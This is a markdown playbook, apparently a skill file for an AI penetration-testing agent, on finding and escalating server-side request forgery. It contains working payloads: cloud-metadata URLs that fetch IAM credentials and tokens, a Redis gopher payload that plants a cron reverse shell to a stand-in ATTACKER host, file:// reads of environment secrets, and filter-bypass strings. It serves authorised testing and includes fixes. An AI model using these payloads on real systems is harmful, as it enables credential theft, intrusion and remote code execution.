---
slug: ssrf
applies_to: [pentester, coder]
owasp: A10
related: [open_redirect, information_disclosure, rce]
---

# Server-Side Request Forgery — Pentester Playbook

> Load this when recon turns up any feature that takes a URL from the user
> and fetches it server-side: webhook senders, image proxies, PDF
> generators, OAuth callbacks, link previewers, "import from URL", profile
> picture uploaders, RSS readers, schema validators.

## When to load this

The endpoints that almost always have SSRF:

- `?url=`, `?source=`, `?dest=`, `?callback=`, `?redirect_uri=`, `?image=` parameters
- POST bodies with `webhook_url`, `import_url`, `avatar_url`, `pdf_source` keys
- Anything that calls itself a "fetcher", "importer", "renderer", or "preview"
- OpenID/OAuth flows where the IdP discovery URL is configurable

The endpoints that often have SSRF but get overlooked:

- XML/SOAP handlers (combine with XXE skill if recon shows XML parsing)
- File upload features that accept a URL instead of multipart bytes
- "Test webhook" / "send test event" buttons in admin panels
- DNS rebinding-vulnerable hosts behind an SSRF that initially looked blocked

## What you're looking for

SSRF isn't one bug, it's three with the same root cause. Triage which one you're working with before crafting payloads:

- **Blind SSRF.** The server fetches your URL but you never see the response. Confirm via OOB callback only.
- **Reflected SSRF.** The server fetches your URL and the response body comes back to you somewhere — directly, inside an error message, embedded as a thumbnail, or wrapped in a PDF.
- **SSRF with response control.** You get the body AND the server respects redirects you send back. This is the "loud" variant that opens the most attack paths because you can pivot from `http://` to `gopher://` or chained redirects to internal scrapers.

## First moves

In order. Don't escalate to gopher/redis/EC2 metadata until you've confirmed basic reachability:

1. **External OAST probe.** Point the URL at your Collaborator/Interactsh/DNS log host. If the DNS or HTTP request lands, the fetcher works and reaches the internet — you have at minimum a blind channel.
2. **Local probe.** `http://127.0.0.1/`, `http://localhost/`, `http://127.1/`, `http://0.0.0.0/`. Watch the response code/timing — connection-refused (~instant) vs filter-rejected (~instant but different body) vs timeout (firewall dropping silently) all mean different things.
3. **Common-port sweep.** Localhost on 22, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211, 27017. A different response code or response time per port maps the local service surface.
4. **Link-local probe.** `http://169.254.169.254/` for AWS/GCP/Azure metadata. `http://metadata.google.internal/computeMetadata/v1/` for GCP. `http://100.100.100.200/` for Alibaba.
5. **Internal hostname guessing.** `http://kubernetes.default.svc/`, `http://*.cluster.local/`, `http://consul:8500/`, `http://vault:8200/`. If recon found a k8s/consul/vault footprint, these will resolve from inside the pod and not from outside.

## Confirming a hit

You need both a side-channel signal AND a controlled response to call it confirmed:

### Out-of-band confirmation
Point the fetcher at a hostname you control. If a DNS request arrives, the fetcher resolved it; if an HTTP request follows, the fetcher actually connected. Tag the request with a unique subdomain per test so you can disambiguate when you spray.

### Differential timing
For blind SSRF: pick two ports on `127.0.0.1`, one open (22, 80) and one closed (1, 65000). Stable timing difference = your fetcher is reaching the localhost interface. Closed port replies fast (RST), filtered port hangs (no response), open port responds normally — three distinct timing buckets.

### Response oracle
For reflected SSRF: fetch a small text file from a host you control, confirm the body shows up in the response. Then fetch a 404 from the same host and confirm the response changes shape. That's proof the fetcher is round-tripping content.

### DNS rebinding confirmation
If localhost is filtered at the IP layer but not the hostname layer, a DNS-rebinding host (point a domain at `127.0.0.1` after the first lookup) proves the filter is purely DNS-based and gives you a stable bypass.

## Going deeper — by environment

**AWS.** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` lists role names, then `/iam/security-credentials/<role>` returns AccessKeyId + SecretAccessKey + Token. IMDSv2 (token-based) blocks the trivial path — but if the SSRF can do PUT requests too (fetchers using libcurl with default method passthrough), you can grab a token via `PUT /latest/api/token` and use it in a follow-up GET.

**GCP.** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` returns a bearer token. Requires `Metadata-Flavor: Google` header — the SSRF must let you set headers (a lot of fetchers do not, but ones built on `requests`/`http.client` with header passthrough do).

**Azure.** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`. Requires `Metadata: true` header.

**Kubernetes.** The pod's own service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Reachable via file:// SSRF if the fetcher honors that scheme. Or hit the API server directly: `https://kubernetes.default.svc/api/v1/namespaces/default/pods` with the pod's bearer token.

**Redis on localhost.** No auth on default install. Use `gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20a%20%22\n*/1%20*%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261\n%22%0d%0aSAVE` — the classic SSRF-to-RCE via cron file write.

**Internal HTTP APIs.** Most useful SSRF outcomes come from hitting admin endpoints that trusted any internal caller — `http://localhost:8001/admin/users`, `http://elasticsearch:9200/_search`, `http://prometheus:9090/api/v1/query?query=...`. Internal services drop auth because "we're behind the VPC."

## When filters get in the way

Standard SSRF defenses (block private IPs, DNS-resolve and reject RFC1918) fail to lots of representations:

- **Decimal IPs.** `http://2130706433/` = `http://127.0.0.1/`. Mixed octal/decimal/hex (`http://0177.0.0.1/`, `http://0x7f.0.0.1/`) breaks naive parsers.
- **Short forms.** `http://127.1/`, `http://127.0.1/`, `http://0/` all resolve to localhost on Linux. Some parsers reject them, the kernel still routes.
- **IPv6 mappings.** `http://[::]/`, `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:7f00:1]/`.
- **DNS to private space.** Register `localhost.attacker.com` with an A record to `127.0.0.1`. Defeats blocklists that check the literal IP only.
- **Userinfo trick.** `http://attacker.com@127.0.0.1/` — parsers that read up to the `@` see `attacker.com` (allowlisted host), parsers that read past it connect to `127.0.0.1`.
- **CRLF in URL.** `http://allowed.com%0d%0aHost:%20127.0.0.1/` against HTTP clients that don't reject embedded CRLFs lets you smuggle the Host header.
- **Open-redirect chain.** If the fetcher rejects `http://internal` but follows redirects, host the redirect on an allowed external server: `https://your-app.com/share?to=http://127.0.0.1/`.
- **DNS rebinding.** Hostname resolves to a public IP on first lookup (passes the validation), then to `127.0.0.1` on the second lookup (which is what the fetcher actually connects to). Tools: `rbndr.us`, custom dnsmasq with low TTL.
- **Schemes other than HTTP.** `file://`, `gopher://`, `dict://`, `ftp://`, `jar://`, `netdoc://` (Java). Each opens a different attack surface — `gopher://` is the SSRF Swiss army knife for talking to text protocols.

## Escalation paths

A confirmed SSRF that only loops back to the same VM is a low. Move it up the severity ladder:

1. **Cloud credentials.** Metadata endpoint → IAM role → S3 read of secrets bucket. Critical if you land on a role with `*` permissions, which is depressingly common.
2. **Internal service compromise.** Unauth Redis / Elasticsearch / Memcached on the same subnet → write a webshell (Redis cron trick) or read data directly.
3. **Lateral pivot.** SSRF that can reach the company VPN/internal DNS lets you probe the internal network surface. Map `*.internal`, `*.corp`, `*.svc.cluster.local`.
4. **Webhook poisoning.** If the SSRF is in a webhook system, point it at an internal admin endpoint and authenticate as the application itself — many apps trust their own outbound requests.
5. **Source-code disclosure.** `file:///proc/self/environ` (env vars including secrets), `file:///app/.env`, `file:///proc/self/cmdline`.

## What a real finding looks like

The report needs:

- The exact request that triggers the fetch (with all headers, since filter bypasses often rely on Host/Origin manipulation)
- Proof of contact with an internal/restricted host: OAST callback log, timing measurement, response body snippet
- The most sensitive thing you were able to read or contact (S3 listing, metadata token, internal admin page) — bound by your scope
- A note on what blocked you from going further (if applicable — "could read metadata but couldn't STS-assume-role because the IAM token was scoped to the EC2 instance only")
- The fix: hostname allowlist OR explicit deny-list of RFC1918+link-local+localhost+IPv6-mapped+DNS-rebind-aware resolver. "Block 127.0.0.1" alone is wrong.

## Common false positives

- **Apparent localhost connectivity that's actually the load balancer.** If you hit `http://127.0.0.1:80/` and get the app's own response, you've found the LB, not a meaningful internal reach. Re-confirm against a non-app port.
- **Timing differences caused by retries.** Some HTTP clients retry on connection-refused with exponential backoff. A "closed port responds slow" pattern can be the client's retry, not the network.
- **DNS resolution that doesn't actually connect.** Some libraries resolve the hostname before checking the SSRF filter, so a DNS hit on your OAST host doesn't always mean the HTTP connection followed.
- **Egress-only WAFs.** Some setups block inbound traffic from the SSRF target but the SSRF itself works fine — your OAST will see the request even though the server saw a connection-reset.

## Related skills

`open_redirect` for chained bypasses, `information_disclosure` for what to do with metadata you've exfiltrated, `rce` for the Redis-cron and `file://` escalation paths.
